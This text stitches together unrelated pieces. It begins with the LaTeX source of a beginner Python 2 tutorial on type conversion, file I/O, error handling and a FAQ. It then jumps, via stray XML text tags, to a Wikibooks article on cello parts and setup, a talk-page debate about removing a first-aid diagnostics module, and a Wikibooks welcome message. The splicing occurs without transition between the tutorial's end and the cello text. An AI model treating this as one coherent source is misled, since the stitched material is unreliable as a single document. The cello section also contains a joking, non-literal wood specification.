&gt;&gt;&gt; &quot;23&quot;*2
'2323'
&gt;&gt;&gt; int(&quot;23&quot;)*2
46
&gt;&gt;&gt; #Float to String
... 
&gt;&gt;&gt; 1.23
1.23
&gt;&gt;&gt; repr(1.23)
'1.23'
&gt;&gt;&gt; #Float to Integer
... 
&gt;&gt;&gt; 1.23
1.23
&gt;&gt;&gt; int(1.23)
1
&gt;&gt;&gt; int(-1.23)
-1
&gt;&gt;&gt; #String to Float
... 
&gt;&gt;&gt; float(&quot;1.23&quot;)
1.23
&gt;&gt;&gt; &quot;1.23&quot; 
'1.23'
&gt;&gt;&gt; float(&quot;123&quot;)
123.0
\end{verbatim}

If you haven't guessed already the function \verb'repr' can convert a integer to a string and the function \verb'int' can convert a string to an integer.  The function {\tt float} can convert a string to a float.  The \verb'repr' function returns a printable representation of something.  Here are some examples of this:
\begin{verbatim}
&gt;&gt;&gt; repr(1)
'1'
&gt;&gt;&gt; repr(234.14)
'234.14'
&gt;&gt;&gt; repr([4,42,10])
'[4, 42, 10]'
\end{verbatim}
The \verb'int' function tries to convert a string (or a float) into a integer.  There is also a similar function called \verb'float' that will convert a integer or a string into a float.  Another function that Python has is the \verb'eval' function.  The \verb'eval' function takes a string and returns data of the type that python thinks it found.  For example:
\begin{verbatim}
&gt;&gt;&gt; v=eval('123')
&gt;&gt;&gt; print v,type(v)
123 &lt;type 'int'&gt;
&gt;&gt;&gt; v=eval('645.123')
&gt;&gt;&gt; print v,type(v)
645.123 &lt;type 'float'&gt;
&gt;&gt;&gt; v=eval('[1,2,3]')
&gt;&gt;&gt; print v,type(v)
[1, 2, 3] &lt;type 'list'&gt;
\end{verbatim}
If you use the \verb'eval' function you should check that it returns the type that you expect.  

One useful string function is the \verb'split' function.  Here's the example:
\begin{verbatim}
&gt;&gt;&gt; import string
&gt;&gt;&gt; string.split(&quot;This is a bunch of words&quot;)
['This', 'is', 'a', 'bunch', 'of', 'words']
&gt;&gt;&gt; string.split(&quot;First batch, second batch, third, fourth&quot;,&quot;,&quot;)
['First batch', ' second batch', ' third', ' fourth']
\end{verbatim}
Notice how \verb'split' converts a string into a list of strings.  The string is split by spaces by default or by the optional second argument (in this case a comma).

\chapter{File IO}
Here is a simple example of file IO:
\begin{verbatim}
#Write a file
out_file = open(&quot;test.txt&quot;,&quot;w&quot;)
out_file.write(&quot;This Text is going to out file\nLook at it and see\n&quot;)
out_file.close()

#Read a file
in_file = open(&quot;test.txt&quot;,&quot;r&quot;)
text = in_file.read()
in_file.close()

print text,
\end{verbatim}
The output and the contents of the file test.txt are:
\begin{verbatim}
This Text is going to out file
Look at it and see
\end{verbatim}
Notice that it wrote a file called test.txt in the directory that you ran the program from.  The \verb'\n' in the string tells Python to put a {\bf n}ewline where it is.  

A overview of file IO is:
\begin{enumerate}
\item Get a file object with the \verb'open' function.
\item Read or write to the file object (depending on how it was opened)
\item Close it
\end{enumerate}

The first step is to get a file object.  The way to do this is to use the \verb'open' function.  The format is \verb'file_object = open(filename,mode)'  where \verb'file_object' is the variable to put the file object, \verb'filename' is a string with the filename, and \verb'mode' is either \verb'&quot;r&quot;' to {\bf r}ead a file or \verb'&quot;w&quot;' to {\bf w}rite a file.  Next the file objects functions can be called.  The two most common functions are \verb'read' and \verb'write'.  The \verb'write' function adds a string to the end of the file.  The \verb'read' function reads the next thing in the file and returns it as a string.  If no argument is given it will return the whole file (as done in the example).  

Now here is a new version of the phone numbers program that we made earlier:
\begin{verbatim}
import string

true = 1
false = 0

def print_numbers(numbers):
    print &quot;Telephone Numbers:&quot;
    for x in numbers.keys():
        print &quot;Name: &quot;,x,&quot; \tNumber: &quot;,numbers[x]
    print

def add_number(numbers,name,number):
    numbers[name] = number

def lookup_number(numbers,name):
    if numbers.has_key(name):
        return &quot;The number is &quot;+numbers[name]
    else:
        return name+&quot; was not found&quot;

def remove_number(numbers,name):
    if numbers.has_key(name):
        del numbers[name]
    else:
        print name,&quot; was not found&quot;


def load_numbers(numbers,filename):
    in_file = open(filename,&quot;r&quot;)
    while true:
        in_line = in_file.readline()
        if in_line == &quot;&quot;:
            break
        in_line = in_line[:-1]
        [name,number] = string.split(in_line,&quot;,&quot;)
        numbers[name] = number
    in_file.close()

def save_numbers(numbers,filename):
    out_file = open(filename,&quot;w&quot;)
    for x in numbers.keys():
        out_file.write(x+&quot;,&quot;+numbers[x]+&quot;\n&quot;)
    out_file.close()
    

def print_menu():
    print '1. Print Phone Numbers'
    print '2. Add a Phone Number'
    print '3. Remove a Phone Number'
    print '4. Lookup a Phone Number'
    print '5. Load numbers'
    print '6. Save numbers'
    print '7. Quit'
    print
\end{verbatim}
\begin{verbatim}
phone_list = {}
menu_choice = 0
print_menu()
while menu_choice != 7:
    menu_choice = input(&quot;Type in a number (1-7):&quot;)
    if menu_choice == 1:
        print_numbers(phone_list)
    elif menu_choice == 2:
        print &quot;Add Name and Number&quot;
        name = raw_input(&quot;Name:&quot;)
        phone = raw_input(&quot;Number:&quot;)
        add_number(phone_list,name,phone)
    elif menu_choice == 3:
        print &quot;Remove Name and Number&quot;
        name = raw_input(&quot;Name:&quot;)
        remove_number(phone_list,name)
    elif menu_choice == 4:
        print &quot;Lookup Number&quot;
        name = raw_input(&quot;Name:&quot;)
        print lookup_number(phone_list,name)
    elif menu_choice == 5:
        filename = raw_input(&quot;Filename to load:&quot;)
        load_numbers(phone_list,filename)
    elif menu_choice == 6:
        filename = raw_input(&quot;Filename to save:&quot;)
        save_numbers(phone_list,filename)
    elif menu_choice == 7:
        pass
    else:
        print_menu()
print &quot;Goodbye&quot;  
\end{verbatim}
Notice that it now includes saving and loading files.  Here is some output of my running it twice:
\begin{verbatim}
&gt; python tele2.py
1. Print Phone Numbers
2. Add a Phone Number
3. Remove a Phone Number
4. Lookup a Phone Number
5. Load numbers
6. Save numbers
7. Quit

Type in a number (1-7):2
Add Name and Number
Name:Jill
Number:1234
Type in a number (1-7):2
Add Name and Number
Name:Fred 
Number:4321
Type in a number (1-7):1
Telephone Numbers:
Name:  Jill     Number:  1234
Name:  Fred     Number:  4321

Type in a number (1-7):6
Filename to save:numbers.txt
Type in a number (1-7):7
Goodbye
\end{verbatim}
\begin{verbatim}
&gt; python tele2.py
1. Print Phone Numbers
2. Add a Phone Number
3. Remove a Phone Number
4. Lookup a Phone Number
5. Load numbers
6. Save numbers
7. Quit

Type in a number (1-7):5
Filename to load:numbers.txt
Type in a number (1-7):1
Telephone Numbers:
Name:  Jill     Number:  1234
Name:  Fred     Number:  4321

Type in a number (1-7):7
Goodbye
\end{verbatim}

The new portions of this program are:
\begin{verbatim}
def load_numbers(numbers,filename):
    in_file = open(filename,&quot;r&quot;)
    while 1:
        in_line = in_file.readline()
        if len(in_line) == 0:
            break
        in_line = in_line[:-1]
        [name,number] = string.split(in_line,&quot;,&quot;)
        numbers[name] = number
    in_file.close()

\end{verbatim}
\begin{verbatim}
def save_numbers(numbers,filename):
    out_file = open(filename,&quot;w&quot;)
    for x in numbers.keys():
        out_file.write(x+&quot;,&quot;+numbers[x]+&quot;\n&quot;)
    out_file.close()
\end{verbatim}

First we will look at the save portion of the program.  First it creates a file object with the command \verb'open(filename,&quot;w&quot;)'.  Next it goes through and creates a line for each of the phone numbers with the command \verb'out_file.write(x+&quot;,&quot;+numbers[x]+&quot;\n&quot;)'.  This writes out a line that contains the name, a comma, the number and follows it by a newline.

The loading portion is a little more complicated.  It starts by getting a file object.  Then it uses a \verb'while 1:' loop to keep looping until a \verb'break' statement is encountered.  Next it gets a line with the line \verb'in_line = in_file.readline()'.  The \verb'readline' function will return an empty string (len(string) == 0) when the end of the file is reached.  The \verb'if' statement checks for this and \verb'break's out of the \verb'while' loop when that happens.  Of course if the \verb'readline' function did not return the newline at the end of the line there would be no way to tell if an empty string was an empty line or the end of the file so the newline is left in what \verb'readline' returns.  Hence we have to get rid of the newline.  The line \verb'in_line = in_line[:-1]' does this for us by dropping the last character.  Next the line \verb'[name,number] = string.split(in_line,&quot;,&quot;)' splits the line at the comma into a name and a number.  This is then added to the \verb'numbers' dictionary.

\section{Exercises}

Now modify the grades program from section \ref{firstgrades} so that is uses file
IO to keep a record of the students.


\chapter{Dealing with the imperfect (or how to handle errors)}

So you now have the perfect program, it runs flawlessly, except for one detail, it will crash on invalid user input.  Have no fear, for Python has a special control structure for you.  It's called \verb'try' and it tries to do something.  Here is an example of a program with a problem:
\begin{verbatim}
print &quot;Type Control C or -1 to exit&quot;
number = 1
while number != -1:
    number = int(raw_input(&quot;Enter a number: &quot;))
    print &quot;You entered: &quot;,number

\end{verbatim}

Notice how when you enter \verb'@#&amp;' it outputs something like:
\begin{verbatim}
Traceback (innermost last):
  File &quot;try_less.py&quot;, line 4, in ?
    number = int(raw_input(&quot;Enter a number: &quot;))
ValueError: invalid literal for int(): @#&amp;
\end{verbatim}

As you can see the \verb'int' function is unhappy with the number \verb'@#&amp;' (as well it should be).  The last line shows what the problem is; Python found a \verb'ValueError'.   How can our program deal with this?  What we do is first: put the place where the errors occurs in a \verb'try' block, and second: tell Python how we want \verb'ValueError's handled.  The following program does this:
\begin{verbatim}
print &quot;Type Control C or -1 to exit&quot;
number = 1
while number != -1:
    try:
        number = int(raw_input(&quot;Enter a number: &quot;))
        print &quot;You entered: &quot;,number
    except ValueError:
        print &quot;That was not a number.&quot;
\end{verbatim}

Now when we run the new program and give it \verb'@#&amp;' it tells us ``That was not a number.'' and continues with what it was doing before.

When your program keeps having some error that you know how to handle, put code in a \verb'try' block, and put the way to handle the error in the \verb'except' block.

\section{Exercises}

Update at least the phone numbers program so it doesn't crash if a
user doesn't enter any data at the menu.

\chapter{The End}

I have run out of interest in adding more to this tutorial.  However, I have
put it up on Wikibooks at \url{http://wikibooks.org/wiki/User:Jrincayc/Contents}, where you can edit it and discuss it.  For the moment I recommend looking at The Python Tutorial by Guido van Rossum.  You should be able to understand a fair amount of it.  

This tutorial is very much a work in progress.  Thanks to everyone 
who has emailed me.  If you have comments, I would recomend that 
you put them on the Wikibooks version (Note the discussion link on
each page) so that everyone can discuss and think about them.

Happy programming, may it change your life and the world.

\chapter{FAQ}

\begin{description}
\item[Can't use programs with input.] If you are using IDLE then try using command line.  This problem seems to be fixed in IDLE 0.6 and newer.  If you are using an older version of IDLE try upgrading to Python 2.0 or newer.
\item[Is there a printable version?] Yes, see the next question.
\item[Is there a PDF or zipped version?] Yes, go to \url{http://www.honors.montana.edu/\~{}jjc/easytut/} for several different versions.  
\item[What is the tutorial written with?] \LaTeX, see the \file{easytut.tex} file.
\item[I can't type in programs of more than one line.]  If the
programs that you type in run as soon as you are typing them in, you
need to edit a file instead of typing them in interactive mode. (Hint:
interactive mode is the mode with the \verb'&gt;&gt;&gt;' prompt in front of
it.)
\item[My question is not answered here.]  Email me and ask.  Please send me source code if at all relevent (even, (or maybe especially) if it doesn't work). Helpful things to include are what you were trying to do, what happened, what you expected to happen, error messages, version of Python, Operating System,  and whether or not your cat was stepping on the keyboard. (The cat in my house has a fondness for space bars and control keys.)
\item[I want to read it in a different language.] There are several translations that I know of.  One is in korean and is available at:
\url{http://home.hanmir.com/~johnsonj/easytut/easytut.html}.  Another is in Spanish and at: \url{http://www.honors.montana.edu/~jjc/easytut/easytut_es/}.  Another is in italian and is available at \url{http://www.python.it/doc/tut_begin/index.html}.   Another is in Greek and available at \url{http://www.honors.montana.edu/~jjc/easytut/easytut_gr/}.   Another is in Russian and is available at \url{http://www.honors.montana.edu/~jjc/easytut/Easytut_Russian/} Several
people have said they are doing a translation in other languages such
as French, but I never heard back from them.  If you have done a translation or know of any translations, please either send it to me or send me a link.  
\item[How do I make a GUI in Python?] You can use either TKinter at \url{http://www.python.org/topics/tkinter/} or WXPython at \url{http://www.wxpython.org/}
\item[How do I make a game in Python?] The best method is probably to use PYgame at \url{http://pygame.org/}
\item[How do I make an exectable from a Python program?] Short answer: Python is an interepreted language so that is impossible. Long answer is that something similar to an executable can be created by taking the Python interpreter and the file and joining them together and distributing that.  For more on that
problem see \url{http://www.python.org/cgi-bin/faqw.py?req=all\#4.28}
\item[I need help with the exercises]  Hint, the password program requires two variables, one to keep track of the number of times the password was typed in, and another to keep track of the last password typed in.   Also you can download solutions from \url{http://www.honors.montana.edu/\~{}jjc/easytut/}
\item[What and when was the last thing changed?] 2000-Dec-16, added error handling chapter.\\
2000-Dec-22, Removed old install procedure.\\
2001-Jan-16, Fixed bug in program, Added example and data to lists section.\\
2001-Apr-5,  Spelling, grammar, added another how to break programs, url fix for PDF version.\\
2001-May-13, Added chapter on debugging.  \\
2001-Nov-11, Added exercises, fixed grammar, spelling, and hopefully improved explanations of some things.\\
2001-Nov-19, Added password exercise, revised references section.\\
2002-Feb-23, Moved 3 times password exercise, changed l to list in list examples question.  Added a new example to Decisions chapter, added two new exercises.\\
2002-Mar-14, Changed abs to my_abs since python now defines a abs function.\\
2002-May-15, Added a faq about creating an executable.  Added a comment from 
about the list example.  Fixed typos from Axel Kleiboemer.\\
2002-Jun-14, Changed a program to use while true instead of while 1 to 
be more clear.\\

%%\chapter{Command Line Install}
%%
%%This is here purely for historical reasons.  
%%
%%\section{Running Python}
%%This section is somewhat vague since I am trying to explain how to run Python in general and not on a specific machine (though I am writing from a Unix viewpoint).  If you have a Microsoft(tm) Windows machine see the next section for details.  If you have a Macintosh see http://www.python.org for other documentation.
%%
%%First you should check to see if you can run Python in interactive mode.  To do this go to a command prompt and type {\tt python}.  If everything is working you should see something like this:
%%\begin{verbatim}
%%Python 1.5.1 (#1, Dec 17 1998, 20:58:15)  [GCC 2.7.2.3] on linux2
%%Copyright 1991-1995 Stichting Mathematisch Centrum, Amsterdam
%%&gt;&gt;&gt;
%%\end{verbatim}
%%The {\tt &gt;&gt;&gt;} is Python's way of telling you it is waiting for you to type something in.  
%%
%%If you did not get the {\tt &gt;&gt;&gt;} prompt then something is wrong.  Check and make sure that you properly installed Python.  Check to see that the python executable is in the path.  
%%
%%Once you got the Python interpreter running you can play around with it.  Here are some things you could try:
%%\begin{verbatim}
%%&gt;&gt;&gt; 1+1
%%2
%%&gt;&gt;&gt; 3*4+5 
%%17
%%&gt;&gt;&gt; a=12
%%&gt;&gt;&gt; a     
%%12
%%&gt;&gt;&gt; &quot;Hi&quot;
%%'Hi'
%%&gt;&gt;&gt; 
%%\end{verbatim}
%%
%%To exit try typing Ctrl+Z or Ctrl+D or if neither of those works type \verb'import sys; sys.exit(0)'.  Next, how to run Python programs.  First you need create a Python program.  To do that you should type in the following in a text editor:\footnote{A text editor is just a program that edits text.  If you are in Windows I recommend that you use Notepad or Editpad (http://www.jgsoft.com).  If you are in Unix I recommend that you use a text editor that you are comfortable with (if you haven't found one yet use pico, ae, or (x)emacs (emacs has a very nice Python mode BTW)).  }
%%\begin{verbatim}
%%print &quot;Hello, World!&quot;
%%\end{verbatim}
%%
%%Now save the file in some convenient location as hello.py.  Next go to directory with the file that you save the file in and type {\tt python hello.py}.  The screen should look something like this:
%%\begin{verbatim}
%%&gt;python hello.py
%%Hello, World!
%%\end{verbatim}
%%
%%If you get some error message check to make sure you saved the file in the right place.  
%%
%%From now on I will mainly give you programs to type in that you should save and then run.  
%%%%If you didn't get that and get some error message like bad command or filename or command not found then either Python is not installed or the Python interpreter is not in your path.  With Windows you need to have the python.exe file locate in your path.  For example, if python.exe is in the directory \verb'C:\PROGRA~1\PYTHON\' then if you add \verb'PATH=C:\PROGRA~1\PYTHON\;%PATH%' to the end of your \verb'AUTOEXEC.BAT' file the next time you reboot your computer python.exe will be found in your path.  For Unix find Python with locate and add the directory to the path (or move python).
%%
%%%%There, you now should be able to type in and run a Python program.  The later chapters will show you more about how to create a Python program.
%%
%%\section{Windows}
%%First install Python.  Then go to a command line which can be done one of two ways: Click {\bf Start&gt;&gt;Programs&gt;&gt;MS-DOS Prompt}, or click {\bf Start&gt;&gt;Run}, then type {\bf command} and hit {\bf Enter}.
%%
%%This will open up a DOS screen with a prompt that probably looks like this:
%%
%%\begin{verbatim}
%%C:\WINDOWS&gt;   
%%\end{verbatim}
%%
%%Type {\bf python} and hit {\bf Enter}.  If you get {\tt Bad command or file name} then either you forgot to install Python or {\tt python.exe} is not in the {\tt PATH} variable (to see what the {\tt PATH} variable has in it type {\bf PATH}).  
%%
%%To fix the problem click {\bf Start&gt;&gt;Find&gt;&gt;Files or Folders} and then look for a file {\bf Named} {\tt python.exe}.  If it is found then the problem is the {\tt PATH}, otherwise Python was not properly installed.  
%%
%%To fix the {\tt PATH} problem the directory that includes {\tt python.exe} needs to be added to {\tt PATH}.  The directory that {\tt python} is in is the folder that {\tt Find} shows to the left of the name.  If the whole name is not shown Right click on the python icon and go to {\bf Properties}.  The {\tt Properties} dialog will have a line called {\tt Location:} that shows the directory where {\tt python.exe} is at.  Next go to the command prompt and type in \verb'PATH=&quot;C:\Location of Python\&quot;;%PATH%'.  For Example:
%%\begin{verbatim}
%%C:\WINDOWS&gt;python
%%Bad command or file name
%%
%%C:\WINDOWS&gt;PATH=&quot;C:\Programe Files\Python&quot;;%PATH%
%%
%%C:\WINDOWS&gt;python
%%Python 1.5.1 (#0, Apr 13 1998, 20:22:04) [MSC 32 bit (Intel)] on win32
%%Copyright 1991-1995 Stichting Mathematisch Centrum, Amsterdam
%%&gt;&gt;&gt;
%%\end{verbatim}
%%Type Ctrl+Z to get out of interactive mode (i.e. hold down the Ctrl Key and then press down on the Z key at the same time, then release both.).
%%
%%Next type this program in a text editor (such as Notepad):
%%\begin{verbatim}
%%print &quot;Hello, World!&quot;
%%\end{verbatim}
%%and save it in a convenient location such as \verb'C:\python\hello.py'.
%%
%%From here you need to change the path to the Python directory where you saved your first program.  The command to do this is (Hit Enter):
%%\begin{verbatim}
%%cd \python      
%%\end{verbatim} 
%%which should give you a prompt like:
%%\begin{verbatim}
%%C:\Python&gt;
%%\end{verbatim}
%%
%%Now you are ready to run your first program.  Just type python hello.py
%%
%%\begin{verbatim}
%%&gt;python hello.py
%%Hello, World!
%%\end{verbatim}
%%
%%From now on in the tutorial I will assume that you know how to create and run programs.
%%
%%
%%\section{Longer Windows install}
%%%%\newcommand{\file}[1]{{\tt#1}}
%%%%\newcommand{\url}[1]{{\tt#1}}
%%
%%\subsection{Download Python}
%%
%%Download \file{py152.exe} from \url{http://www.python.org/download/download\_windows.html}   The file is located at \url{ftp://ftp.python.org/pub/python/win32/py152.exe}   Download this file and save it to your computer.
%%
%%\subsection{Install Python}
%%
%%Run \file{py152.exe} by double clicking on the executable.  This will start the Python installation process.  Use the defaults for the install.  The computer will restart after this is done.
%%
%%%%The Python installation creates a folder \file{Python 1.5}.  Go to Start$\to$ Programs$\to$ Python~1.5
%%
%%\subsection{Add Python to Path}
%%
%%The next step is to add the Python executable to the path.  The path specifies how DOS finds commands.  First you will find where the Python executable was installed.  Next create a \file{PATH} command to tell DOS where to find Python.  Lastly add the \file{PATH} command to the autoexec.bat so that it will be permanent.  The following tells how to do this.
%%
%%This is what you should do to add Python to the path. First get to an MS-DOS Prompt.  The way to get to a MS-DOS Prompt is go to Start$\to$Run.  When the Run dialog pops up type \type{command} and press Enter (Note: don't type the ``quotation marks'', just type the stuff between them)  (Note two: type Enter after everything that I put in this \type{font}).  A window titled MS-DOS Prompt should appear.  
%%
%%Type \type{cd \textbackslash{}}.  The command \type{cd} stands for change directory.  When \type{cd} is followed by a \type{\textbackslash{}} it means change to the root directory.  The \file{C:\textbackslash{}&gt;} prompt tells you that you are in the root directory.  Once in the root directory the next task is to find Python. 
%%
%%Type \type{dir /s python.exe}  This should give you some output like:
%%\begin{verbatim}
%%
%% Volume in drive C is WIN 95
%% Volume Serial Number is 283F-12D9
%%
%%Directory of C:\Program Files\Python
%%
%%PYTHON   EXE         5,120  04-13-99 11:31a python.exe
%%         1 file(s)          5,120 bytes
%%
%%Total files listed:
%%         1 file(s)          5,120 bytes
%%         0 dir(s)     344,498,176 bytes free
%%
%%\end{verbatim}
%%The important part of this is the line:
%%\begin{verbatim}
%%Directory of C:\Program Files\Python
%%\end{verbatim} 
%%which shows the directory that \file{python.exe} is located in. This can be used to create a \file{PATH} variable that allows \file{python} to be run from anywhere on the system.  The syntax is  \type{PATH=\%PATH\%;&quot;directory&quot;} where directory is the directory that \file{python.exe} is in.  For this example the command is:
%%\begin{verbatim}
%%PATH=%PATH%;&quot;C:\Program Files\Python&quot;
%%\end{verbatim}
%%
%%Type this in at the DOS Prompt and then you should be able to run Python with the \type{python} command.  If you did everything right you should see (version numbers and dates may be different):
%%\begin{verbatim}
%%Python 1.5.2 (#4, Dec 16 1999, 18:55:39)  [GCC 2.7.2.3] on Win 95
%%Copyright 1991-1995 Stichting Mathematisch Centrum, Amsterdam
%%&gt;&gt;&gt; 
%%\end{verbatim}
%%If you get the \file{$&gt;&gt;&gt;$} prompt you have gotten into Python.  Try typing in it \type{print &quot;Hello&quot;}.  You should see \file{Hello} printed.  Try tying \type{print 1+1}.  You should see \file{2} printed.  Type \type{Ctrl-Z} (i.e. type z while holding down the Ctrl key) to get out of Python's interactive mode.  
%%
%%If there is some problem with the \file{PATH} then you will see something like:
%%\begin{verbatim}
%%C:\&gt;python
%%Bad command or file name
%%\end{verbatim}
%%
%%Right now the change you made is only temporary.  To get Python to be in the \file{PATH} every time the computer starts you need to add it to the \file{autoexec.bat} file.  The \file{autoexec.bat} file is run every time the computer starts.  To do this open the \file{autoexec.bat} in a text editor like \file{notepad}.  Type the command \type{notepad c:\textbackslash{}autoexec.bat} on the DOS Prompt.  If you don't have a \file{autoexec.bat} notepad will ask you if you want to create one (say yes).  Add the line that you used above (i.e. something like: \type{PATH=\%PATH\%;&quot;C:\textbackslash{}Program Files\textbackslash{}Python&quot;}) to the \file{autoexec.bat}.  Add the line as close to the bottom as you can, just don't add the line after a line that tells windows to load:
%%\begin{verbatim}
%%PATH=%PATH%;&quot;C:\Program Files\Python&quot;
%%win
%%\end{verbatim} 
%%The \file{win} loads Windows so I added the path line above it.  If you don't see a \file{win} line add the path line to the end.  Save the \file{autoexec.bat} file, reboot your computer and it should be install.
%%
%%When your computer boots again go to the DOS Prompt and try to run \type{python} again to see if the change was successful.
%%
%%\subsection{Running Programs}
%%
%%Now that Python is set up we need to use it to run programs.  Go to a DOS Prompt (Start$\to$Run, then type \type{command}).  Change to the root directory (\type{cd \textbackslash{} }).  Now make a directory with the command \type{mkdir prg} which makes the directory \file{prg}.  Switch into that directory with the \type{cd prg} command.  Create a file there by typing the \type{notepad hello.py} command.  That will open a \file{notepad} window.  In Notepad type:
%%\begin{verbatim}
%%print &quot;Hello, World!&quot;
%%\end{verbatim}
%%Save the file and then go back to the DOS Prompt.  Now type \type{python hello.py} in at the DOS Prompt.  Python should reply with \file{Hello, World!} if everything is working right.  If you get the error: 
%%\begin{verbatim}
%%Bad command or file name
%%\end{verbatim}
%%check to see if the path is correct.  Also check to make sure that you spelled \file{python} correctly.  If you get the error:
%%\begin{verbatim}
%%C:\PROGRA~1\PYTHON\PYTHON.EXE: can't open file 'hello.py'
%%\end{verbatim}
%%check to see that you properly saved the \file{hello.py} file and that you are in the correct directory.
%%
%%Once you have that working create another file with the \type{notepad ask.py} command.  Put the following text in the file:
%%\begin{verbatim}
%%data = raw_input(&quot;Type something here:&quot;)
%%print &quot;You typed:&quot;,data
%%\end{verbatim} 
%%Save and then run with the \type{python ask.py} command.  The program should ask you to type in data and after you hit Enter it will tell you what you type.  You should get something like this:
%%\begin{verbatim}
%%Type something here:Hi
%%You typed: Hi
%%\end{verbatim}
%%If you got that, congratulations, you now have a working Python environment.

      <text xml:space="preserve">The cello is a member of the violin family (violin, viola, cello, bass viol).  These four instruments (and other variants; violino piccolo, hardanger, baryton, viola d'amore, the Hutchins Octet, etc.) are topologically similar.  Beginning at the top, the major components are as follows:  Scroll, pegbox, pegs, nut, fingerboard, neck, body, strings, bridge, tailpiece, saddle, tailgut, endpin, and the soundpost (which is inside the body).  Linings and corner blocks are structural parts and can be seen by looking through the &quot;F&quot; holes.  

The scroll is more decorative than anything else.  Its mass is a factor, but the shape is not.  The scroll and neck are traditionally made from quartersawn maple.  This is a very stable grain orientation and a yields an attractive grain pattern.  Maple is quite strong and reasonably light.

The pegbox and scroll are an integral part of the neck.  They have tapered holes  to hold the pegs and a hollow area to allow the strings to wind around the pegs.

The pegs allow tensioning the strings.  They are precisely tapered to allow adjustment of their friction for easy tuning but minimal slippage.  Pegs are traditionally made from ebony, boxwood, or rosewood.  Cheaper instruments may use dyed pearwood or other very hard woods.  Occasionally, &quot;patent&quot; tuning pegs suchg as Caspari pegs are found and, even less commonly, geared machine tuners.  If the pegs should slip, a light application of chalk or a peg compound will often fix the problem.  If they stick, a tiny bit of beeswax may help.  Peg compound can be purchased at any violin shop.  It is a compressed mixture of wax and some very mild abrasive in a convenient stick.  You can do great damage by using a do-it-yourself approach to repairs.  Anything serious should be referred to a competent violin shop.  A cracked pegbox or damaged pegs are not always easy or cheap to fix.

The strings wrap around the pegs, pass over the nut, fingerboard and bridge, and are attached at the other end to the tailpiece.  The height of the nut and bridge are adjusted so that the strings are just barely above the fingerboard at the nut, but the height increases towards the bridge so that the strings are about a quarter inch above the end of the fingerboard.  If the string height at the nut is too low, the strings are prone to buzz.  If too high, playability in the lower positions is poor.  If the height at the bridge is low, the strings will buzz.  If the bridge is high, the instrument will be unplayable in the thumb positions.  It is best to have a competent cellist evaluate the setup of your instrument if you are a novice.  There are nuances to setting the string height and bridge  that many violin shops do not get right.  Violin shops probably deal with violins twenty times more than they deal with cellos.  It takes time to setup an instrument properly and an inexpensive  student-grade cello will most surely be adjusted badly when it is purchased.  It is well worth the expense to have it properly adjusted and a decent set of strings installed.  The difference in sound quality and playability that can be achieved even on a cheap instrument is remarkable.  It is unfortunately beyond the scope of this article to explain the intimate details.  

Strings vary widely in price and quality.  The strings supplied with cheap imported instruments cost $5 at most (2007 prices) and are not even fit to use for slicing cheese.  Plan on spending closer to $100. Or, $150 and more for an advanced player.  They do wear out.  Don't expect to buy strings once a decade.  Strings range from plain steel to exotic tungsten and titanium alloys.  Whether you should get gut or nylon or Kevlar or steel or carbon fiber or other cores and windings depends on the kind of music, your skill and your instrument.  Generally, an instrument for orchestral use will have heavier and stiffer strings.  An instrument for chamber music will tend towards nylon and gut with silver.  Soloists often opt for the more exotic materials to extract every bit of potential from their instrument.  The difference between a $5 and a $50 set is immediately obvious to the player and listener.  Beyond that, the tonal differences to the listener are more subtle but the difference in playability can still be huge.  You will need to experiment and find what strings are best suited to your instrument and skill.

The fingerboard is traditionally ebony.  Cheaper instruments may have rosewood or dyed pear or some other substitute.  Occasionally some odd composite can be found, such as carbon fiber.  The fingerboard is not flat in either direction.  It curves from side to side to allow bowing each string individually.  There is a slight hollow along the length to give more clearance when playing louder.  The C and G strings have a flat area towards the bridge since they vibrate much more than the D and A and would otherwise buzz.

The bridge is special.  It looks like maple, but isn't exactly.  At least not the same variety that is used for the back and ribs.  It is cut in a unique grain direction to yield the distinct spotted pattern found on the best bridges. As you bow the strings, they move from side to side.  The top of the cello moves forward and back, like a drum.  The bridge and soundpost transform the sideways string motion into a perpendicular motion that allows sound to be radiated.  The height, width, thickness, curvature and stiffness of the bridge are all crucial to sound quality and playability.  If the feet of your bridge (against the top) look like the sort of shoes Frankenstein wears, some ignorant brute has simply slapped an unshaped blank onto the instrument.  It will hold the strings in the air, but no more.  A properly cut bridge is graceful.  A good bridge and strings will make a $50 instrument sound like one worth a thousand.  A bad bridge will make the best instrument sound like it has been filled with glue. 

Top: finest Italian spruce, cut in January in the dark of the moon from the south side of the tree, aged 200 years and shaped without a piece of sandpaper or a router within miles of it.

Back: Quartered maple.

Tailpiece: ebony.

Saddle: ebony.

Tailgut: genuine gut, not nylon.

Endpin:  Ebony and metal.

      <text xml:space="preserve">==Keep the Article?==
I don't think we should keep this article.  Even in an advanced first aid situation, it isn't necessary to check the lymph nodes of a patient or check for clubbing.  Cyanosis is good, but could be moved into other articles.  Anemia isn't something one would check for either in a first aid (or advanced first aid) situation.  Anyways, for jaundice, it is easier to check the &quot;white part&quot; of the eye.  I don't think that this is necessary even under advanced first aid as these are things mostly checked for in a hospital or doctor's office.  None are life threatening (except for maybe cyanosis.) [[User:Mike6271|Mike6271]] 03:25, 7 July 2007 (UTC)

:I don't think we need this module either. All of this is beyond [[first Aid/What Is First Aid?|first aid]], and is starting to get into first responder or EMT - type skills. They might have a better place in a wikibook aimed at that audience. Even putting them in the advanced topics chapter isn't really satisfactory since they're not first aid at all, not even advanced first aid.
:Cyanosis should be covered in [[First Aid/Vitals]] as part of circulation.
:[[User:Owain.davies|Owain.davies]] left me a message about this: [[User Talk:Mike.lifeguard#Additional diagnostics]]. I agree that rescuers should be doing stuff between calling EMS and EMS arriving - but the secondary assessment should fill that time amply. SJA seems to think that it takes 20 minutes to do a thorough secondary - I don't think it takes ''that'' long, but it'll probably fill your time until EMS arrives.

::This is really treading into EMT territory with an extended assessment. Remember, FIRST Aid, not Secondary Aid. Not even First Responders are trained in a extended assessment, that skill is left for the EMTs. (We just brought this up at class today.)--[[User:Nugger|Nugger]] 03:33, 5 August 2007 (UTC)</text>

      <text xml:space="preserve">==Welcome!==
[[Help:Welcome, newcomers|Welcome to Wikibooks]], a collection of open-content textbooks! You don't have to [[Special:Userlogin|log in]] to read or edit articles on Wikibooks, but creating an account is quick, free and non-intrusive, requires no personal information, and gives you many benefits, including:
*The use of a username of your choice
*The ability to view all your contributions via a &quot;My contributions&quot; link 
*Your own [[wikipedia:user page|user page]] 
*Your own talk page which, if you choose, also allows users to send you messages without knowing your e-mail address
*The use of your own personal [[Special:Watchlist|watchlist]] to which you can add articles that interest you
*The ability to rename pages.
*The ability to [[Special:Upload|upload images]] 
*The ability to customize the appearance and behavior of the website
